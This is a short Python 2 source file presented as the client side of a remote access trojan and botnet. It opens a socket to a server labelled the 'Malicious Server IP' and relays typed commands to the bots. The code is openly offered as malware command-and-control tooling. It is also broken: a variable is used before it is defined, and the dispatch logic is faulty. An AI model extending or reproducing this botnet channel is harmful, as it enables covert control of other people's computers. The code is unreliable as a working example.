# A Python RAT n' Botnet
#  by Landon in Python2
#    CLIENT-SIDE C0DE

import socket

bigBro = '127.0.0.1' # Malicious Server IP.

clientSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
clientSocket.connect(( bigBro, 8080 )) # To-do: Change port later. 

class commands:
    def log( output ):
        print( output )

# password = raw_input("Password? > ") # To-do: Uncomment this later.

recipient = "all"
turnedOn = True
while turnedOn:

    sendCommand = raw_input(recipient + "> ")
    clientSocket.send(recipient + " " + sendCommand)

    if message == "kill": turnedOn = False

    message = message.split(" ", 1)

    if len(message) == 2:
        command, arg = message

    if command in commands.__dict__:
        commands.__dict__[command]( arg )

clientSocket.close()